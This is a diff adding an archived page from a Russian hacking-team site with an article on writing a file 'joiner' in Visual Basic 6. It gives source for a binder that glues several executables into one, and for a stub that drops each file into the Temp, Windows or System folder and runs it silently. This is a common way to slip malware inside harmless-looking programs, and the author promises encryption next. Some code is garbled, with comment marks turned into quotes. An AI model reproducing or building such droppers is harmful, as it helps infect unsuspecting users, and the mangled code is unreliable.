@@ -1,0 +1,992 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//RU">
+<html>
+<head>
+      <meta HTTP-EQUIV="Content-Type" Content="text-html; charset=windows-1251">
+      <title>.:.[ LOCK-TEAM ].:.[ Статьи ].:. VB : Пишем joiner + интерфейс</title>
+      <meta name="Description" content="Сетевая безопасность, Hack and Security">
+      <meta name="KeyWords" content="WSR,  .:.[ LOCK-TEAM ].:.[ Статьи ].:. VB : Пишем joiner + интерфейс, Пишем, joiner, на, VB, (+интерфейс).
+
+0x1, :[, Интра, ]:
+0x2, :[, Приборы, и, материалы, ]:
+0x3, :[, Пишем, joiner, ]:
+0x4, :[, Пишем, stub, ]:
+0x5, :[, Заключение, ]:
+
+
+[0x1]
+Привет!, Это, моя, первая, статья, так,, что, не, судит, строго., Эту, тему, я, выбрал, так, как, ничего, похожего, на, VB, я, в, и-нете, не, видел., Так, что, приш">
+      <meta name="Author" content="WSR">
+      <meta name="robots" content="index,all">
+      <meta name="revisit" content="10 days">
+      <link rel="stylesheet" type="text/css" href="/style/templates/lock-team/css/style.css">
+      <link rel="shortcut icon" href="/style/templates/lock-team/images/favicon.ico">
+      <!--http://lock-team.com.org.biz.int.pro.arpa.aero.coop.museum.name.info.edu.gov.mil.net.ru/-->
+</head>
+
+<script language="Javascript" type="text/javascript">
+///articles/vb/4.html
+defaultStatus = ".:.[ LOCK-TEAM ].:.";
+
+function imgFade ( object, destOp, rate, delta ) {
+         imgFadeObjects = new Object ( );
+         imgFadeTimers = new Object ( );
+         if ( !document.all ) return
+         if ( object != "[object]" ) {
+            setTimeout ( "imgFade("+object+","+destOp+","+rate+","+delta+")",0 );
+            return;
+         }
+
+         clearTimeout ( imgFadeTimers[object.sourceIndex] );
+
+         diff = destOp - object.filters.alpha.opacity;
+         direction = 1;
+         if  ( object.filters.alpha.opacity > destOp ) {
+            direction = -1;
+    }
+    delta = Math.min ( direction * diff, delta );
+    object.filters.alpha.opacity += direction * delta;
+
+    if ( object.filters.alpha.opacity != destOp ) {
+        imgFadeObjects[object.sourceIndex] = object;
+        imgFadeTimers[object.sourceIndex] = setTimeout ( "imgFade(imgFadeObjects["+object.sourceIndex+"],"+destOp+","+rate+","+delta+")",rate );
+    }
+}
+
+function mousein ( cart ) {
+         cart.style.backgroundColor = "#EAEAEA";
+}
+
+function mouseout ( cart ) {
+         cart.style.backgroundColor = "#FCFCFC";
+}
+
+</script>
+
+<body bottommargin="0" leftmargin="0" topmargin="0" rightmargin="0" marginheight="0" marginwidth="0" background="/style/templates/lock-team/images/bg.gif">
+<a name="top"></a>
+
+<table cellspacing="0" cellpadding="0" class="maintb" align="center" bgcolor="#ffffff" width="900">
+<tr>
+    <td>
+        <table cellspacing="0" cellpadding="0" width="100%" border="0" background="/style/templates/lock-team/images/2.jpg">
+        <tr>
+            <td align="right" style="padding-top : 25px;"><img src="/style/templates/lock-team/images/lock.gif" border="0"></td>
+            <td align="center" style="padding-left : 21px;"><a href="/" target="_parent" title="Lock-Team"><img src="/style/templates/lock-team/images/666_1.jpg" border="0" alt=".:.[ This Is Lock-Team Home Page ].:."></a></td>
+            <td align="left" style="padding-top : 25px;"><img src="/style/templates/lock-team/images/team.gif" border="0"></td>
+        </tr>
+        </table>
+        <table cellspacing="9" cellpadding="0" width="100%" border="0" height="100%">
+        <tr>
+            <td valign="top" width="150">
+                <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Navigation ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="0" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                <TABLE cellSpacing="0" cellPadding="0" width="100%" border="0">
+                                
+                                
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/news.html" title="Новости"  >Новости</a>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/articles.html" title="Статьи" style="color:red" >Статьи</a>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 15px;">
+                                        <img src="/style/templates/lock-team/images/menu3.gif" width="12" height="8" border="0">
+                                        <a href="/articles/modding.html" title="Modding"  >Modding</a><br>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 15px;">
+                                        <img src="/style/templates/lock-team/images/menu3.gif" width="12" height="8" border="0">
+                                        <a href="/articles/mysql.html" title="MySQL"  >MySQL</a><br>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 15px;">
+                                        <img src="/style/templates/lock-team/images/menu3.gif" width="12" height="8" border="0">
+                                        <a href="/articles/vb.html" title="VB" style="color:red" >VB</a><br>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/forum.html" title="Форум"  ><b class=date>Форум</b></a>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/service.html" title="Услуги"  >Услуги</a>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/web_tools.html" title="Web-Tools"  >Web-Tools</a>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="/my_archive.html" title="My Archive"  >My Archive</a>
+                                    </td>
+                                </tr>
+                                
+
+                                </table>
+                            </TD>
+                        </TR>
+                        </TABLE>
+                    </TD>
+                </TR>
+                </TABLE>
+                
+                <br>
+                
+                <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Friends ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="0" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                <TABLE cellSpacing="0" cellPadding="0" width="100%" border="0">
+                                
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="http://web-hack.ru/" title="Hack and Sequrity" target="_blank">Web-Hack</a><br>
+                                    </td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;">
+                                        <img src="/style/templates/lock-team/images/menu2.gif" width="12" height="8" border="0">
+                                        <a href="http://antichat.ru/" title="" target="_blank">AntiChat</a><br>
+                                    </td>
+                                </tr>
+                                
+
+                                </table>
+                            </TD>
+                        </TR>
+                        </TABLE>
+                    </TD>
+                </TR>
+                </TABLE>
+                
+                <br>
+
+                <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ IRC ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="2" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                
+                          <center class=porr>Наш IRC канал :</center><br>
+                          <center class=por>irc.nn.ru : 6667<br>#lock-team</center>
+               
+                            </TD>
+                        </TR>
+                        </TABLE>
+                    </TD>
+                </TR>
+                </TABLE>
+                
+                <br>
+                
+                <table bgcolor="#999999" border="0" cellpadding="0" cellspacing="1" width="150">
+                <tr>
+                    <td background="/style/templates/lock-team/images/001.gif" bgcolor="#fcfcfc" height="16" colspan="2"><center><b class=label>.:.[ Team ].:.</b></center></td>
+                </tr>
+                <tr>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="0" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;" align="center" valign="middle" width="16"><IMG src="http://web.icq.com/whitepages/online?icq=918318&img=5" border="0" width="16" height="16"></td>
+                                    <td align="center"><b class="por">918318</b></td>
+                                    <Td align="center"><a href="/team/members/1.html"><b class=porr>WSR</a></td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;" align="center" valign="middle" width="16"><IMG src="http://web.icq.com/whitepages/online?icq=334855&img=5" border="0" width="16" height="16"></td>
+                                    <td align="center"><b class="por">334855</b></td>
+                                    <Td align="center"><a href="/team/members/2.html"><b class=porr>Ra1n0</a></td>
+                                </tr>
+                                
+
+                                <tr onmouseover="mousein(this);" onmouseout="mouseout(this);">
+                                    <td style="padding-left : 5px;" align="center" valign="middle" width="16"><IMG src="http://web.icq.com/whitepages/online?icq=755587&img=5" border="0" width="16" height="16"></td>
+                                    <td align="center"><b class="por">755587</b></td>
+                                    <Td align="center"><a href="/team/members/3.html"><b class=porr>Fragnatic</a></td>
+                                </tr>
+                                
+
+                                </table>
+                            </td>
+                        </tr>
+                        </table>
+                    </td>
+                </tr>
+                </table>
+
+                <br>
+
+                <table bgcolor="#999999" border="0" cellpadding="0" cellspacing="1" width="150">
+                <tr>
+                    <td background="/style/templates/lock-team/images/001.gif" bgcolor="#fcfcfc" height="16" colspan="2"><center><b class=label>.:.[ Your Info ].:.</b></center></td>
+                </tr>
+                <tr>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="0" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                <TABLE cellSpacing="0" cellPadding="3" border="0">
+                                <tr>
+                                    <td><b class=porr>U-A</b></td>
+                                    <td class=por align="center">Mozilla FireFox</td>
+                                </tr>
+                                <tr>
+                                    <td><b class=porr>U-A v.</b></td>
+                                    <td><center class=por>1.5</center></td>
+                                </tr>
+                                <tr>
+                                    <td><b class=porr>Gzip</b></td>
+                                    <td><center class=por>On</center></td>
+                                </tr>
+                                <tr>
+                                    <td><b class=porr>IP</b></td>
+                                    <td><center class=por>127.0.0.1</center></td>
+                                </tr>
+                                </table>
+                            </td>
+                        </tr>
+                        </table>
+                    </td>
+                </tr>
+                </table>
+            </td>
+
+            <td width="100%" valign="top">
+                <TABLE cellSpacing="1" cellPadding="2" width="100%" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Content ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" style="padding : 10px;" >
+                        <center class="date">\x77\x77\x77<b class=date>\x2E</b>\x6C\x6F\x63\x6B<b class=date>\x2D</b>\x74\x65\x61\x6D<b class=date>\x2E</b>\x63\x6F\x6D</center>
+                        <center class="date">.:.[ Articles ].:.</center>
+                        <br><center class="porr">Раздел VB -> <b class="por">Пишем joiner + интерфейс</b></center>
+<center class="porr">Статья добавлена: <b class="por">2006-02-09</b></center>
+<center class="porr">Кем добавлена: <b class="por">wsr</b></center>
+
+<table cellpadding="0" cellspacing="0" border="0" width="100%" align="center">
+
+<tr>
+    <td colspan="2" width="100%" class="date2" style="text-align : justify; color : #004040; "><bR>Пишем joiner на VB (+интерфейс).<br />
+<br />
+<b class=porr>0x1 <b class=por>:[ Интра ]:</b><br />
+0x2 <b class=por>:[ Приборы и материалы ]:</b><br />
+0x3 <b class=por>:[ Пишем joiner ]:</b><br />
+0x4 <b class=por>:[ Пишем stub ]:</b><br />
+0x5 <b class=por>:[ Заключение ]:</b><br />
+</b><br />
+<br />
+<b class=porr>[0x1]</b><br />
+Привет! Это моя первая статья так, что не судит строго. Эту тему я выбрал так как ничего похожего на VB я в и-нете не видел. Так что пришлось писать своё чудо :)<br />
+<br />
+<b class=porr>[0x2]</b><br />
+Компилятор: Micro$oft Visual Basic (я использовал версию 6.0)<br />
+Немного ума и прямые руки )<br />
+Цель: нужно сделать удобный joiner с интерфейсом, который будет склеивать N-ое количество файлов. Каждый файл будет распаковываться в свою папку. Вот и всё. Остаётся дело за малым :))<br />
+<br />
+<b class=porr>[0x3]</b><br />
+Итак начнём<br />
+В общем нам понадобиться два проекта. Один будет с GUI интерфейсом, который склеивает файлы (назовём его Joiner). Второй будет переносчик файлов (назовём его Stub).<br />
+<br />
+Делаем первый проект.<br />
+Тут нам понадобится форма, 2 buttons, 4 options box, 1 checkbox, listview, commondialog, textbox+всякие примочки (в общем см.рис1). Короче примерно размещаем и обзываем объекты как показано на рисунке:<br />
+<br />
+<center><img src="/files/images/terran/joiner.jpg"></center><br />
+<br />
+Теперь начинаем писать код:<br />
+<code><br />
+Option Explicit<br />
+<br />
+Private Const JoinerName "T3RR4N"s JOINER"<br />
+Private Const JoinerVersion "1.0"<br />
+Private bGet As Boolean<br />
+Private bSet As Boolean<br />
+"-------------------------<br />
+Private Sub Form_Load()<br />
+On Error Goto ErrorHandler " Отлавливаем ошибки<br />
+<br />
+Dim StubSize as Long<br />
+Dim StubPath as String<br />
+<br />
+" Обрабатываем ListView<br />
+ListView1.View = lvwReport<br />
+With ListView1.ColumnHeaders<br />
+.Add , , "Путь", 4000<br />
+.Add , , "Имя", 1500<br />
+.Add , , "Размер", 1500<br />
+.Add , , "Запуск", 1500<br />
+ 	.Add , , "Распаковка", 1500<br />
+End With<br />
+Me.ListView1.GridLines = True<br />
+<br />
+StubPath = App.Path & "stub.exe"			" Stub должен лежать в папке с joiner"ом<br />
+StubSize = FileLen(StubPath)			" Размер Stub"а в байтах<br />
+<br />
+With Me.ListView1.ListItems.Add(, , StubPath)<br />
+        .SubItems(1) = "Stub.exe"<br />
+        .SubItems(2) = FileLen(StubPath)<br />
+        .SubItems(3) = "1"<br />
+        .SubItems(4) = "A"<br />
+End With<br />
+<br />
+" Заголовок главного окна<br />
+Me.Caption = JoinerName & "-v" & JoinerVersion & " Размер Stub"a = " & StubSize<br />
+<br />
+Exit Sub<br />
+ErrorHandler:<br />
+MsgBox Err.Description, vbCritical + vbOKOnly, JoinerName & " VER:" & JoinerVersion<br />
+Err.Clear<br />
+End<br />
+<br />
+End Sub<br />
+"-------------------------<br />
+" Первая кнопка "Добавить файл" назовём её "CmdAddFile" и обрабатываем событие<br />
+Private Sub CmdAddFile_Click()<br />
+On Error GoTo AddFileError<br />
+<br />
+    CommonDialog.Flags = &H1000 + &H4 + &H8 + &H800<br />
+    CommonDialog.DialogTitle = "Добавить для склейки"<br />
+    CommonDialog.Filter = "Все файлы (*.*)|*.*"<br />
+    CommonDialog.DefaultExt = Empty<br />
+    CommonDialog.ShowOpen<br />
+<br />
+    Me.Enabled = False<br />
+    Me.MousePointer = 11<br />
+<br />
+    With Me.ListView1.ListItems.Add(, , CommonDialog.FileName)<br />
+        .SubItems(1) = CommonDialog.FileTitle<br />
+        .SubItems(2) = FileLen(CommonDialog.FileName)<br />
+        .SubItems(3) = "1"<br />
+        .SubItems(4) = "T"<br />
+    End With<br />
+<br />
+AddFileError:<br />
+    Me.MousePointer = 0<br />
+    Me.Enabled = True<br />
+<br />
+End Sub<br />
+"-------------------------<br />
+ " A - App.Path (Текущая директория)<br />
+" T - Temp (Временная директория)<br />
+" W - Windows (Windows директория)<br />
+" S - System (Windows/System(WIN9x) OR Windows/System32(Nt-Like))<br />
+Private Sub SetSettings()<br />
+Dim v1 As Integer<br />
+<br />
+    If bGet = True Then Exit Sub<br />
+    bSet = True<br />
+<br />
+    v1 = Me.ListView1.SelectedItem.Index<br />
+    Me.ListView1.ListItems.Item(v1).SubItems(1) = Me.Text1.Text<br />
+<br />
+    If Me.Check1.Value = 1 Then<br />
+        Me.ListView1.ListItems.Item(v1).SubItems(3) = "1"<br />
+    Else<br />
+        Me.ListView1.ListItems.Item(v1).SubItems(3) = "0"<br />
+    End If<br />
+<br />
+    If Me.Option4.Value = True Then Me.ListView1.ListItems.Item(v1).SubItems(4) = "A"<br />
+    If Me.Option3.Value = True Then Me.ListView1.ListItems.Item(v1).SubItems(4) = "T"<br />
+    If Me.Option2.Value = True Then Me.ListView1.ListItems.Item(v1).SubItems(4) = "W"<br />
+    If Me.Option1.Value = True Then Me.ListView1.ListItems.Item(v1).SubItems(4) = "S"<br />
+<br />
+    bSet = False<br />
+<br />
+End Sub<br />
+"-------------------------<br />
+" Определение настроек каждого файла отдельно!!!<br />
+Private Sub GetSettings()<br />
+<br />
+    If bSet = True Then Exit Sub<br />
+    bGet = True<br />
+<br />
+    Me.Text1.Text = Me.ListView1.SelectedItem.SubItems(1)<br />
+<br />
+    If Me.ListView1.SelectedItem.SubItems(3) = "1" Then<br />
+        Me.Check1.Value = 1<br />
+    Else<br />
+        Me.Check1.Value = 0<br />
+    End If<br />
+<br />
+    If UCase(Me.ListView1.SelectedItem.SubItems(4)) = "A" Then Me.Option4.Value = True<br />
+    If UCase(Me.ListView1.SelectedItem.SubItems(4)) = "T" Then Me.Option3.Value = True<br />
+    If UCase(Me.ListView1.SelectedItem.SubItems(4)) = "W" Then Me.Option2.Value = True<br />
+    If UCase(Me.ListView1.SelectedItem.SubItems(4)) = "S" Then Me.Option1.Value = True<br />
+<br />
+    bGet = False<br />
+<br />
+End Sub<br />
+"-------------------------<br />
+" Вторая кнопка<br />
+Private Sub CmdBind_Click()<br />
+On Error GoTo BindError<br />
+Dim v1 As Long<br />
+<br />
+    CommonDialog.Flags = &H400 + &H4 + &H8 + &H2 + &H800<br />
+    CommonDialog.DialogTitle = "Сохранить склеинный файл"<br />
+    CommonDialog.Filter = "Exe File (*.exe)|*.exe"<br />
+    CommonDialog.DefaultExt = ".exe"<br />
+    CommonDialog.ShowSave<br />
+<br />
+    If (CommonDialog.FileName = Empty) Then<br />
+        Exit Sub<br />
+    End If<br />
+<br />
+    If FileExist(CommonDialog.FileName) = True Then Kill CommonDialog.FileName<br />
+<br />
+    Call BindFiles(CommonDialog.FileName)<br />
+<br />
+    MsgBox CommonDialog.FileName & vbCrLf & "склеен!!!", vbOKOnly + vbInformation, "Респект!"<br />
+Exit Sub<br />
+BindError:<br />
+MsgBox Err.Description, vbCritical + vbOKOnly, JoinerName & " VER:" & JoinerVersion<br />
+Err.Clear<br />
+End<br />
+End Sub<br />
+"-------------------------<br />
+" Процедура склеивания<br />
+Private Sub BindFiles(BindFile As String)<br />
+Dim v1 As Long<br />
+Dim v2 As Long<br />
+Dim v3 As Long<br />
+Dim Str1 As String<br />
+Dim Data() As Byte<br />
+<br />
+    v2 = 1<br />
+<br />
+    For v1 = 1 To Me.ListView1.ListItems.Count<br />
+<br />
+        v3 = FileLen(Me.ListView1.ListItems.Item(v1))<br />
+<br />
+        ReDim Data(v3 - 1)<br />
+<br />
+        Open Me.ListView1.ListItems.Item(v1) For Binary Access Read As #1<br />
+            Get #1, , Data()<br />
+        Close #1<br />
+<br />
+        Open BindFile For Binary As #1<br />
+            Put #1, v2, Data()<br />
+        Close #1<br />
+<br />
+        v2 = v2 + v3<br />
+        DoEvents<br />
+<br />
+    Next v1<br />
+<br />
+    For v1 = 1 To Me.ListView1.ListItems.Count<br />
+        Str1 = Str1 & Me.ListView1.ListItems.Item(v1).SubItems(1) & "|" & Me.ListView1.ListItems.Item(v1).SubItems(2) & "|" & Me.ListView1.ListItems.Item(v1).SubItems(3) & "|" & Me.ListView1.ListItems.Item(v1).SubItems(4) & "|Џ"<br />
+    Next v1<br />
+<br />
+    Open BindFile For Binary As #3<br />
+        Put #3, LOF(3) + 1, "<Ќ>" & Str1 & "</Ќ>"<br />
+    Close #3<br />
+<br />
+<br />
+End Sub<br />
+<br />
+Private Sub ListView1_Click()<br />
+    Call GetSettings<br />
+End Sub<br />
+"-------------------------<br />
+" Остальные подпрограммы<br />
+Private Function FileExist(FileName As String) As Boolean<br />
+<br />
+    If Dir(FileName) <> Empty Then<br />
+        FileExist = True<br />
+    Else<br />
+        FileExist = False<br />
+    End If<br />
+<br />
+End Function<br />
+<br />
+Private Sub Option1_Click()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+Private Sub Option2_Click()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+Private Sub Option3_Click()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+Private Sub Option4_Click()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+Private Sub Check1_Click()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+Private Sub Text1_Change()<br />
+    Call SetSettings<br />
+End Sub<br />
+<br />
+" ***********************<br />
+" Закончили писать joiner<br />
+" ***********************<br />
+</code><br />
+<br />
+<b class=porr>[0x5]</b><br />
+<br />
+<code><br />
+" *****************<br />
+" Теперь пишем Stub<br />
+" *****************<br />
+<br />
+Тут еам не понадобиться никакая форма так что убираем всё. Добавляем модуль. Далее привожу текст модуля.<br />
+<br />
+Option Explicit<br />
+<br />
+" Объявляем WinAPI<br />
+" ShellExecuteA - командная сторка<br />
+" GetTempPathA - возвращает значение временной директории<br />
+" GetWindowsDirectoryA - папка винды<br />
+" GetSystemDirectoryA - системная папка<br />
+"-------------------------<br />
+Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long<br />
+Private Declare Function GetTempPathA Lib "kernel32" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long<br />
+Private Declare Function GetWindowsDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long<br />
+Private Declare Function GetSystemDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long<br />
+<br />
+Public Sub Main()<br />
+On Error Resume Next<br />
+<br />
+    Dim Str1    As String<br />
+    Dim Str2    As String<br />
+    Dim Str3    As String<br />
+    Dim Str4    As String<br />
+<br />
+    Dim Var1()  As String<br />
+    Dim Var2()  As String<br />
+<br />
+    Dim v1      As Long<br />
+    Dim v2      As Long<br />
+    Dim v3      As Long<br />
+    Dim v4      As Long<br />
+<br />
+    Str1 = App.Path & "" & App.EXEName & ".exe"<br />
+<br />
+    Open Str1 For Binary As #1<br />
+        Str4 = Space(LOF(1))<br />
+        Get #1, , Str4<br />
+    Close #1<br />
+<br />
+    v1 = InStr(1, Str4, "<Ќ>", vbBinaryCompare)<br />
+    v2 = InStr(1, Str4, "</Ќ>", vbBinaryCompare)<br />
+<br />
+    If v1 > 0 And v2 > 0 Then<br />
+<br />
+        Str4 = Mid(Str4, v1 + 3, v2 - v1 - 3)<br />
+        Var1 = Split(Str4, "Џ", , vbBinaryCompare)<br />
+        Str4 = Empty<br />
+<br />
+        Open Str1 For Binary As #3<br />
+            Str3 = Space(LOF(3))<br />
+            Get #3, , Str3<br />
+        Close #3<br />
+<br />
+        Var2 = Split(Var1(0), "|", , vbBinaryCompare)<br />
+<br />
+        v4 = Val(Var2(1))<br />
+<br />
+        For v3 = 1 To UBound(Var1) - 1<br />
+<br />
+            Var2 = Split(Var1(v3), "|", , vbBinaryCompare)<br />
+<br />
+            Str2 = GetInstallPath(Var2(3)) & "" & Var2(0)<br />
+<br />
+            Str4 = Mid(Str3, v4 + 1, Val(Var2(1)))<br />
+<br />
+            Open Str2 For Binary Access Write As #2<br />
+                Put #2, , Str4<br />
+            Close #2<br />
+            DoEvents<br />
+<br />
+            If Var2(2) = 1 Then Call ShellExecuteA(0, "Open", Str2, "", App.Path, 1)<br />
+<br />
+            v4 = v4 + Val(Var2(1))<br />
+<br />
+        Next v3<br />
+<br />
+    End If<br />
+<br />
+End Sub<br />
+"-------------------------<br />
+Private Function GetInstallPath(Data As String) As String<br />
+Dim lpBuffer As String<br />
+lpBuffer = Space(260)<br />
+<br />
+Select Case LCase(Data)<br />
+<br />
+    Case "s"<br />
+        GetInstallPath = Left$(lpBuffer, GetSystemDirectoryA(lpBuffer, 260))<br />
+<br />
+    Case "w"<br />
+        GetInstallPath = Left$(lpBuffer, GetWindowsDirectoryA(lpBuffer, 260))<br />
+<br />
+    Case "t"<br />
+        GetInstallPath = Left$(lpBuffer, GetTempPathA(260, lpBuffer))<br />
+<br />
+    Case "a"<br />
+        GetInstallPath = App.Path<br />
+<br />
+End Select<br />
+<br />
+<br />
+End Function<br />
+<br />
+"********************<br />
+" Закончили писать stub<br />
+"********************<br />
+</code><br />
+<br />
+<b class=porr>[0x6]</b><br />
+<br />
+Компилируем Stub, Joiner, кидаем в папку с joiner"ом файл stub"a и радуемся жизни :)))<br />
+В дополнении хотелось бы сказать что тут можно сделать много каких фишек. Например шифрование. Но это будет уже следующая статья :))<br />
+<br />
+EOF<br />
+<br />
+</td>
+</tr>
+
+<tr>
+    <td colspan="2" align="center"><br><b class=porr>Комментарии (<b class=por>нет</b>)</b><br><br></td>
+</tr>
+
+
+
+
+<tr>
+    <form method="POST">
+    <input type="HIDDEN" name="action" value="add_new_comment">
+    <td colspan="2">
+        <br>
+        <center>
+                <b class=porr>Добавление нового комментария</b><br>
+                <textarea class="button" style="background : white; width : 100%; height : 55px;" name="content"></textarea><br>
+                <input type="SUBMIT" class="button" value="Добавить">
+        </center>
+    </td>
+    </form>
+</tr>
+
+
+
+
+</table><br><br>
+                        <center class="date">.:.[ /Articles ].:.</center>
+                        <center class="date">\x77\x77\x77<b class=date>\x2E</b>\x6C\x6F\x63\x6B<b class=date>\x2D</b>\x74\x65\x61\x6D<b class=date>\x2E</b>\x63\x6F\x6D</center>
+                    </TD>
+                </TR>
+                </TABLE>
+                
+                <br>
+                <TABLE cellSpacing="1" cellPadding="2" width="100%" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Forums Posts ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" style="padding : 5px;">
+                        <table cellpadding="0" cellspacing="0" border="0" align="center" width="100%" style="border : 1px solid #999999; border-bottom : 0;">
+<tr>
+    <td class="last_nazv"><font class="date">Название темы + описание</font></td>
+    <td class="last_otv"><font class="date">Ответов</font></td>
+    <td class="last_author"><font class="date">Автор темы</font></td>
+    <td class="last_author"><font class="date">Просмотров</font></td>
+    <td class="last_obn" align="center"><font class="date">Обновление</font></td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=2" target="_blank">Second title</a></td>
+    <td class="last_otv"><b class="por">5</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">1</b></td>
+    <td class="last_obn"><tt class=date>2006-01-28 22:16:40</tt><br>
+        <a href="/forum/showthread.php?t=2&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=2" target="_blank">Second title</a></td>
+    <td class="last_otv"><b class="por">5</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">1</b></td>
+    <td class="last_obn"><tt class=date>2006-01-28 22:16:32</tt><br>
+        <a href="/forum/showthread.php?t=2&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=2" target="_blank">Second title</a></td>
+    <td class="last_otv"><b class="por">5</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">1</b></td>
+    <td class="last_obn"><tt class=date>2006-01-28 22:16:24</tt><br>
+        <a href="/forum/showthread.php?t=2&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=2" target="_blank">Second title</a></td>
+    <td class="last_otv"><b class="por">5</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">1</b></td>
+    <td class="last_obn"><tt class=date>2006-01-28 22:16:16</tt><br>
